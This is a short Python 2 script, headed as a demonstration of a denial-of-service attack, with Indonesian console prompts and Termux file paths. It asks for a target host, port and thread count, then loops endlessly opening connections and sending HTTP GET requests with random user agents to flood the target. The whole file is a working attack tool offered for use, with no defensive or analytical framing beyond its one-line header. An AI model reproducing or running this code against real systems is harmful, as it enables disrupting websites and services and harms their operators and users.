#Demonstration of a Denial of service attack.
#Email: khanhnn@pythonvietnam.info
 
import threading
import socket
import random
import sys
 
global headers,UsAg,host,port
 
def UserAgent():
    userAg=[]
    File=open("/data/data/com.termux/files/home/dos/lib/UserAgent","r")   #your path
    for line in File:
        userAg.append(line)
    return userAg
 
def TakeDown(host="",port=80):
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except socket.error,msg:
        print"   ERROR:",msg
    else:
        try:
            host=socket.gethostbyname(host)
        except socket.gaierror:
            print"   WEB TIDAK VALID CUKK!!!!."
            sys.exit()
        else:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(UsAg)+"\n"+headers).encode('utf-8')
            if sock.connect_ex((host,port))==0:
                if sock.sendall(packet)==None:
                    print"   ATTACK TO TARGET!"
                    sock.close()
                else:
                    print"   ADA KESALAHAN SAAT MENGIRIM!"
                    sys.exit()
 
if __name__=="__main__":
    host=raw_input("   MASUKAN TARGET:~ # ")
    port=raw_input("   MASUKAN PORT:~ # ")
    threads=raw_input("   Masukan Jumlah threads:~ # ")
    threads=int(threads)
    port=int(port)
    UsAg=UserAgent()
   
    fp=open("/data/data/com.termux/files/home/dos/lib/headers.txt","r")
    headers=fp.read()
    fp.close()
    while True:
        for i in range(threads):
            th=threading.Thread(target=TakeDown,args=(host,port,),name="User-"+str(1))
            th.Daemon=True #thread dies if it exits!
            th.start()
            th.join()#make the attack sequential
